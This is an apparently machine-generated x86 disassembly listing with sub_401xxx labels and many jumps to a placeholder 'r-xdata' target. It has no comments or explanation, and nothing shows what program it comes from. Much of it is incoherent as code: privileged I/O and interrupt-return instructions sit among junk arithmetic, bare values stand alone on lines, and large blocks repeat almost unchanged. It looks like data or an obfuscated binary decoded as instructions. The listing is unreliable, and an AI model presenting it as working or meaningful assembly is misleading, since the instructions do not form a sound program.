jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
push edx
push esp
push edx
call sub_401d2b
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jno r-xdata
and ebx 0x870f4975
jae r-xdata
call sub_401e90
jb 0xffffffff81b29b46
or edx 0x54549c55
ja r-xdata
xor ebx 0xff3d870f
call sub_401c7b
and ecx 0x6c870f59
push edi
push edi
push ebp
pushfd
add eax 0xde810f
add [ eax ] al
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x7548e2de
jg r-xdata
ja 0xcaa0da
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop ecx
jno r-xdata
call 0xf44e50d
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
jae r-xdata
xor esi 0xe681cd75
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
jae r-xdata
jmp 0xffffffffff799dc2
pop edx
jge r-xdata
jo 0xffffffff854f77d3
pop eax
jae r-xdata
and esi 0xc2817577
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f44e299
add [ eax ] al
dec ecx
pop ecx
jne r-xdata
jbe 0xffcefd8
add esp 0x4
jae r-xdata
jl 0xf3a05c
jg r-xdata
add eax 0x5abb2979
pop edx
jg r-xdata
and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804f92f4
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
jno r-xdata
jge 0xffffffffffa0a317
pop eax
jg r-xdata
jge 0xffffffff894f7755
jae r-xdata
and edx 0xff53830f
pop edx
pop edx
jne r-xdata
jne r-xdata
mov eax 0xfeef890f
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
jge r-xdata
jpe 0x74cd2f1b
ja r-xdata
jno 0xffffffffe89171f2
push 0x81ffffff
out 0x77 al
jne r-xdata
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
push esp
push ebp
push edi
sub esp 0x4
call sub_401d36
jae 0xffffffffff43a55b
xor ecx 0x890fd079
or esi 0xff24810f
ja r-xdata
and eax 0x4c48358
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jns r-xdata
sub ebx 0xe8525452
insb
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
jno r-xdata
jae 0xffffffff842897d1
sub esp 0x28
pop ecx
pop edx
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub ebx 0xff2f850f
jns 0x158a2b6
push edi
call sub_401f88
jg 0xfffffffff0b379af
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133ae32
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
jae r-xdata
je 0xffffffffff6da3a3
jge r-xdata
les ecx [ eax ]
add [ eax ] al
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x586614ab
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a7985
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jae r-xdata
call 0xffffffff854f79bf
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95bc60
jo 0xffffffffa2c12e73
push ecx
push edx
call sub_401f58
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c152b5
push edx
call sub_401ef4
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_401f6f
jo 0xff9955c
jo 0xffffffff894f7999
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_401f32
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
push esp
push eax
call sub_401fd8
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53a4e3
push esp
pushfd
push ecx
sub esp 0xc
call sub_401f55
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_401ccb
ja r-xdata
jno r-xdata
jl 0x2f28b92c
jno r-xdata
jl 0xfffffffff6c1da8f
add [ eax ] al
add [ edx + 0x7504c483 ] bh
pop edx
pop edx
jns 0xffffffff814ff93a
ja r-xdata
jae r-xdata
xor ecx 0xc18d0f
add [ eax ] al
sub esi 0x73bd047f
push ebp
jne r-xdata
jge r-xdata
jmp [ 0xffffffff8964ba73 ]
sub [ esp + 0x58 ] 0x2
sub esp 0x14
pop ecx
jne r-xdata
je 0xffffffffffa3a400
pop eax
jne r-xdata
xor edi 0x9b810f
add [ eax ] al
jg r-xdata
xor ecx 0xff70810f
jae r-xdata
ja 0xffffffff89a45965
jno r-xdata
mov ebx 0xf04c483
ja r-xdata
call 0xffc959e
cmp [ edi + 0x7f ] 0x81

ja r-xdata
or ebx 0xff6e8f0f
jns r-xdata
mov [ fs : edi ] ecx
or esp 0x0
add [ eax ] al
pop eax
ja r-xdata
xor edx 0x880f5e7f
add [ eax ] al
jns r-xdata
mov edi 0x9c555757
ja r-xdata
xor ebx 0xff3d870f
ja r-xdata
jg r-xdata
mov ebp 0xf5d7d58
cmp [ ebp + 0x36 ] 0x3d77870f
jne r-xdata
add edi 0xad850f58
add [ eax ] al
add al ch
jne r-xdata
sub edi 0x64244481
movsd [ edi ] [ esi ]
and eax [ eax ]
add esp 0x4
ja r-xdata
jl 0xffffffffffacad2c
jae r-xdata
ja 0xffffffffa3c32cc4
jae r-xdata
xor ebx 0xff728f0f
jae r-xdata
jmp 0xffffffffff799dc2
ja r-xdata
jge 0x71fc5c07
jg r-xdata
xor esi 0x25ffca77
jg r-xdata
jo 0xffffffffcbc19bc9
jg r-xdata
jpo 0xdea2aa
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
jge r-xdata
add esi 0x83575554
in al dx
add al 0xe8
jae r-xdata
sub ecx 0xfeea830f
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
jg r-xdata
and ebx 0xff5a870f
jg r-xdata
add eax 0x5abb2979
jno r-xdata
mov [ fs : edx + 0x5a ] ebx
add [ ecx + 0x42850fe2 ] 0xffffffff
jg r-xdata
add ecx 0xaa890f
add [ eax ] al
jns r-xdata
mov ebp 0x79055573
sub [ ebx - 0x7ed288a6 ] edi
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_402099
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
jg r-xdata
sub edi 0xf681b871
jne r-xdata
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
xor al [ ecx ]
add [ eax ] al
jae r-xdata
or edx 0xf0c775a
xor [ ebx + 0x3e ] 0x5a59ef81
jne r-xdata
jg r-xdata
or eax 0x97e8569c
add [ eax ] al
add [ ecx - 0x5b70f015 ] al
add [ eax ] al
add [ ecx + 0xc775aca ] al
jno 0xffffffffefc15aee
jno r-xdata
sub esi 0x89641f79
ja r-xdata
jge r-xdata
call [ 0xffffffffca81677d ]
jns r-xdata
test [ edi ] 0x9b81
add [ edi ] cl
mov ebx 0x812d775a
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff92722
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
push edx
push esp
push edx
call sub_401d2b
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jae r-xdata
and esi 0x89641273
jae r-xdata
mov ebp 0x478f0f5a
pushfd
push esi
call sub_401cff
sub ebx 0xa48f0f
add [ eax ] al
sub [ ecx + 0x1 ] 0x0
add [ edi ] cl
adc [ edi + edx * 2 + 0x56 ] 0x55
call sub_401e19
add esi 0xa6830f
add [ eax ] al
mov esp 0x58246c83
add al [ ebx + 0xf5914ec ]
test esp ebx
add [ eax ] al
add [ ebx + 0xf04c483 ] bh
add esp 0x4
jne r-xdata
mov eax [ fs : 0xff37958 ]
test [ ebx - 0x1e ] esi
jae r-xdata
call [ 0xffffffffc181727f ]
push ecx
push edx
push ebp
sub esp 0x4
call sub_401ccb
xor ebx 0x15ff4e7f
mov edx 0xff47830f
jno r-xdata
mov esi 0x83555251
in al dx
add al 0xe8
sti
add [ eax ] al
add [ ecx - 0xb1800d ] al
adc eax 0xc181727f
jge r-xdata
mov [ fs : edi - 0x21 ] esi
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x7548e2de
jg r-xdata
ja 0xcaa0da
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop ecx
jno r-xdata
call 0xf44e50d
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
pop eax
pop eax
pop edx
jne r-xdata
call 0xf48e1e4
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
ja 0xffffffffff9b9f81
jae r-xdata
add edx 0xff108f0f
call sub_401c7b
and ecx 0x6c870f59
push edi
push edi
push ebp
pushfd
add eax 0xde810f
add [ eax ] al
rol [ ecx + 0x108f0fc2 ] 0xff
push ebp
pushfd
call sub_401d08
mov edx 0x7504c483
mov esp 0xe2818371
jne r-xdata
or edx 0xf3812e79
pop edx
jge r-xdata
jo 0xffffffff854f77d3
pop eax
jae r-xdata
and esi 0xc2817577
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f44e299
add [ eax ] al
dec ecx
pop ecx
jne r-xdata
jbe 0xffcefd8
jae r-xdata
call sub_401e90
jb 0xffffffff81b29b46
or edx 0x54549c55
jno r-xdata
and ebx 0x870f4975
ja r-xdata
pop edx
mov eax 0xff55870f
pop eax
jge r-xdata
jge 0xffffffffffa29fb4
pop edx
jg r-xdata
and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804f92f4
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
jno r-xdata
jge 0xffffffffffa0a317
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
jae r-xdata
xor esi 0xe681cd75
pop ecx
jns r-xdata
jno 0xffffffff874f5267
jae r-xdata
and edx 0xff53830f
pop edx
pop edx
jne r-xdata
jne r-xdata
mov eax 0xfeef890f
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
jge r-xdata
jpe 0x74cd2f1b
add esp 0x4
jae r-xdata
jl 0xf3a05c
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
push esp
push ebp
push edi
sub esp 0x4
call sub_401d36
jae 0xffffffffff43a55b
xor ecx 0x890fd079
or esi 0xff24810f
ja r-xdata
and eax 0x4c48358
pop eax
jg r-xdata
jge 0xffffffff894f7755
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jns r-xdata
sub ebx 0xe8525452
insb
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
ja r-xdata
jno 0xffffffffe89171f2
push 0x81ffffff
out 0x77 al
jne r-xdata
sub esp 0x28
pop ecx
pop edx
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub ebx 0xff2f850f
jns 0x158a2b6
push edi
call sub_401f88
jg 0xfffffffff0b379af
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133ae32
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
add [ eax ] al
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x586614ab
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a7985
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jno r-xdata
jae 0xffffffff842897d1
jae r-xdata
call 0xffffffff854f79bf
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95bc60
jo 0xffffffffa2c12e73
push ecx
push edx
call sub_401f58
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c152b5
push edx
call sub_401ef4
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_401f6f
jo 0xff9955c
jo 0xffffffff894f7999
jae r-xdata
je 0xffffffffff6da3a3
jge r-xdata
les ecx [ eax ]
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_401f32
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
push esp
push eax
call sub_401fd8
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53a4e3
push esp
pushfd
push ecx
sub esp 0xc
call sub_401f55
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_401cff
pop ecx
ja r-xdata
pop edx
ja r-xdata
jae 0xffffffff81ce9264
pop eax
jns r-xdata
jno 0xffffffffefc15aee
out dx eax
jae r-xdata
jne 0xffffffffe3c1fefd
push ecx
push edx
push ebp
sub esp 0x4
call sub_401ccb
xor ebx 0x15ff4e7f
mov edx 0xff47830f
jg r-xdata
sub edi 0x5c755a59
ja r-xdata
jg r-xdata
add ecx 0xaa890f
add [ eax ] al
jno r-xdata
jno 0xfffffffff1c1a634
ja r-xdata
jge 0x71fc5c07
jge r-xdata
call [ 0xffffffffca81677d ]
jae r-xdata
xor ecx 0xc18d0f
add [ eax ] al
sub esi 0x73bd047f
push ebp
ja r-xdata
and edx 0xff42850f
jno r-xdata
jno r-xdata
mov [ fs : edx + 0x5a ] ebx
add [ ecx + 0x42850fe2 ] 0xffffffff
jno r-xdata
mov esi 0x83555251
in al dx
add al 0xe8
sti
add [ eax ] al
add [ ecx - 0xb1800d ] al
adc eax 0xc181727f
jae r-xdata
xor ebx 0xff728f0f
sub [ esp + 0x58 ] 0x2
sub esp 0x14
pop ecx
jne r-xdata
je 0xffffffffffa3a400
pop eax
jne r-xdata
xor edi 0x9b810f
add [ eax ] al
jl 0xfffffffff6c1da8f
jge r-xdata
jmp [ 0xffffffff8964ba73 ]
ja r-xdata
jmp [ 0xfffffffff381df77 ]
jno r-xdata
sub esi 0x89641f79
push ebp
pushfd
call sub_401d08
mov edx 0x7504c483
rol [ ecx + 0x108f0fc2 ] 0xff
mov esp 0xe2818371
jne r-xdata
mov ebp 0xf5d7d58
cmp [ ebp + 0x36 ] 0x3d77870f
jg r-xdata
and ebx 0xff5a870f
jno r-xdata
mov ebx 0xf04c483
ja r-xdata
call 0xffc959e
cmp [ edi + 0x7f ] 0x81

jae r-xdata
ja 0xffffffff89a45965
jne r-xdata
add edi 0xad850f58
add [ eax ] al
add al ch
pop eax
jge r-xdata
jge 0xffffffffffa29fb4
jae r-xdata
or edx 0xf0c775a
xor [ ebx + 0x3e ] 0x5a59ef81
jne r-xdata
pop eax
ja r-xdata
xor edx 0x880f5e7f
add [ eax ] al
jns r-xdata
mov edi 0x9c555757
jns r-xdata
mov [ fs : edi ] ecx
or esp 0x0
add [ eax ] al
jg r-xdata
pop edx
pop edx
jg r-xdata
xor esi 0x25ffca77
jg r-xdata
jo 0xffffffffcbc19bc9
pop ecx
jns r-xdata
jno 0xffffffff874f5267
pushfd
push esi
call sub_401cff
sub ebx 0xa48f0f
add [ eax ] al
sub [ ecx + 0x1 ] 0x0
add [ edi ] cl
adc [ edi + edx * 2 + 0x56 ] 0x55
call sub_401e19
add esi 0xa6830f
add [ eax ] al
mov esp 0x58246c83
add al [ ebx + 0xf5914ec ]
test esp ebx
add [ eax ] al
add [ ebx + 0xf04c483 ] bh
add esp 0x4
jne r-xdata
mov eax [ fs : 0xff37958 ]
test [ ebx - 0x1e ] esi
jne r-xdata
sub edi 0x64244481
movsd [ edi ] [ esi ]
and eax [ eax ]
add esp 0x4
ja r-xdata
jl 0xffffffffffacad2c
jae r-xdata
ja 0xffffffffa3c32cc4
jns r-xdata
mov ebp 0x79055573
sub [ ebx - 0x7ed288a6 ] edi
jae r-xdata
add edx 0xff108f0f
jg r-xdata
jpo 0xdea2aa
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
jge r-xdata
add esi 0x83575554
in al dx
add al 0xe8
jae r-xdata
sub ecx 0xfeea830f
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
jns r-xdata
test [ edi ] 0x9b81
add [ edi ] cl
mov ebx 0x812d775a
ja r-xdata
pop edx
mov eax 0xff55870f
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_402099
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
jg r-xdata
sub edi 0xf681b871
jne r-xdata
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
xor al [ ecx ]
add [ eax ] al
jge r-xdata
mov [ fs : edi - 0x21 ] esi
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff92722
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
push edx
push esp
push edx
call sub_401d2b
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jae r-xdata
and esi 0x89641273
jae r-xdata
mov ebp 0x478f0f5a
jne r-xdata
or edx 0xf3812e79
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x7548e2de
jg r-xdata
ja 0xcaa0da
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop ecx
jno r-xdata
call 0xf44e50d
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
pop eax
pop eax
pop edx
jne r-xdata
call 0xf48e1e4
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
ja 0xffffffffff9b9f81
jg r-xdata
xor ecx 0xff70810f
jg r-xdata
or eax 0x97e8569c
add [ eax ] al
add [ ecx - 0x5b70f015 ] al
add [ eax ] al
add [ ecx + 0xc775aca ] al
pop edx
jge r-xdata
jo 0xffffffff854f77d3
pop eax
jae r-xdata
and esi 0xc2817577
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f44e299
add [ eax ] al
dec ecx
pop ecx
jne r-xdata
jbe 0xffcefd8
jae r-xdata
call sub_401e90
jb 0xffffffff81b29b46
or edx 0x54549c55
jno r-xdata
and ebx 0x870f4975
ja r-xdata
or ebx 0xff6e8f0f
jae r-xdata
call [ 0xffffffffc181727f ]
pop edx
jg r-xdata
and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804f92f4
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
jno r-xdata
jge 0xffffffffffa0a317
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
jae r-xdata
xor esi 0xe681cd75
ja r-xdata
xor ebx 0xff3d870f
call sub_401c7b
and ecx 0x6c870f59
push edi
push edi
push ebp
pushfd
add eax 0xde810f
add [ eax ] al
jae r-xdata
and edx 0xff53830f
pop edx
pop edx
jne r-xdata
jne r-xdata
mov eax 0xfeef890f
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
jge r-xdata
jpe 0x74cd2f1b
add esp 0x4
jae r-xdata
jl 0xf3a05c
jae r-xdata
jmp 0xffffffffff799dc2
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
push esp
push ebp
push edi
sub esp 0x4
call sub_401d36
jae 0xffffffffff43a55b
xor ecx 0x890fd079
or esi 0xff24810f
ja r-xdata
and eax 0x4c48358
pop eax
jg r-xdata
jge 0xffffffff894f7755
jg r-xdata
add eax 0x5abb2979
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jns r-xdata
sub ebx 0xe8525452
insb
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
ja r-xdata
jno 0xffffffffe89171f2
push 0x81ffffff
out 0x77 al
jne r-xdata
sub esp 0x28
pop ecx
pop edx
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub ebx 0xff2f850f
jns 0x158a2b6
push edi
call sub_401f88
jg 0xfffffffff0b379af
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133ae32
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
add [ eax ] al
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x586614ab
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a7985
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jno r-xdata
jae 0xffffffff842897d1
jae r-xdata
call 0xffffffff854f79bf
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95bc60
jo 0xffffffffa2c12e73
push ecx
push edx
call sub_401f58
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c152b5
push edx
call sub_401ef4
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_401f6f
jo 0xff9955c
jo 0xffffffff894f7999
jae r-xdata
je 0xffffffffff6da3a3
jge r-xdata
les ecx [ eax ]
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_401f32
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
push esp
push eax
call sub_401fd8
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53a4e3
push esp
pushfd
push ecx
sub esp 0xc
call sub_401f55
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_401d08
pop eax
jne r-xdata
jne r-xdata
sub edi 0xfeb2810f
pop eax
jge r-xdata
jge 0xffffffffffa29fb4
pop ecx
jns r-xdata
jno 0xffffffff874f5267
jg r-xdata
jo 0xffffffffcbc19bc9
ja r-xdata
jns r-xdata
mov ebp 0x79055573
sub [ ebx - 0x7ed288a6 ] edi
jg r-xdata
jno r-xdata
mov [ fs : edx + 0x5a ] ebx
jns r-xdata
test [ edi ] 0x9b81
add [ edi ] cl
mov ebx 0x812d775a
jge r-xdata
call [ 0xffffffffca81677d ]
jno r-xdata
sub esi 0x89641f79
ja r-xdata
jae r-xdata
xor ecx 0xc18d0f
add [ eax ] al
sub esi 0x73bd047f
push ebp
jge r-xdata
mov [ fs : edi - 0x21 ] esi
jno r-xdata
mov esi 0x83555251
in al dx
add al 0xe8
sti
add [ eax ] al
add [ ecx - 0xb1800d ] al
adc eax 0xc181727f
jae r-xdata
xor ebx 0xff728f0f
push ecx
push edx
push ebp
sub esp 0x4
call sub_401ccb
xor ebx 0x15ff4e7f
mov edx 0xff47830f
jne r-xdata
add edi 0xad850f58
add [ eax ] al
add al ch
sub [ esp + 0x58 ] 0x2
sub esp 0x14
pop ecx
jne r-xdata
je 0xffffffffffa3a400
pop eax
jne r-xdata
xor edi 0x9b810f
add [ eax ] al
jl 0xfffffffff6c1da8f
jne r-xdata
or edx 0xf3812e79
push ebp
pushfd
call sub_401d08
mov edx 0x7504c483
rol [ ecx + 0x108f0fc2 ] 0xff
mov esp 0xe2818371
ja r-xdata
mov ebp 0xf5d7d58
cmp [ ebp + 0x36 ] 0x3d77870f
jg r-xdata
and ebx 0xff5a870f
add ecx 0xaa890f
add [ eax ] al
jg r-xdata
xor esi 0x25ffca77
jno r-xdata
mov ebx 0xf04c483
ja r-xdata
call 0xffc959e
cmp [ edi + 0x7f ] 0x81

ja r-xdata
jg r-xdata
xor ecx 0xff70810f
jg r-xdata
or eax 0x97e8569c
add [ eax ] al
add [ ecx - 0x5b70f015 ] al
add [ eax ] al
add [ ecx + 0xc775aca ] al
jno 0xffffffffefc15aee
jge 0x71fc5c07
jae r-xdata
or edx 0xf0c775a
xor [ ebx + 0x3e ] 0x5a59ef81
jne r-xdata
jns r-xdata
mov [ fs : edi ] ecx
or esp 0x0
add [ eax ] al
pop eax
ja r-xdata
xor edx 0x880f5e7f
add [ eax ] al
jns r-xdata
mov edi 0x9c555757
jge r-xdata
jmp [ 0xffffffff8964ba73 ]
ja r-xdata
or ebx 0xff6e8f0f
jae r-xdata
call [ 0xffffffffc181727f ]
add [ ecx + 0x42850fe2 ] 0xffffffff
pushfd
push esi
call sub_401cff
sub ebx 0xa48f0f
add [ eax ] al
sub [ ecx + 0x1 ] 0x0
add [ edi ] cl
adc [ edi + edx * 2 + 0x56 ] 0x55
call sub_401e19
add esi 0xa6830f
add [ eax ] al
mov esp 0x58246c83
add al [ ebx + 0xf5914ec ]
test esp ebx
add [ eax ] al
add [ ebx + 0xf04c483 ] bh
add esp 0x4
jne r-xdata
mov eax [ fs : 0xff37958 ]
test [ ebx - 0x1e ] esi
jne r-xdata
sub edi 0x64244481
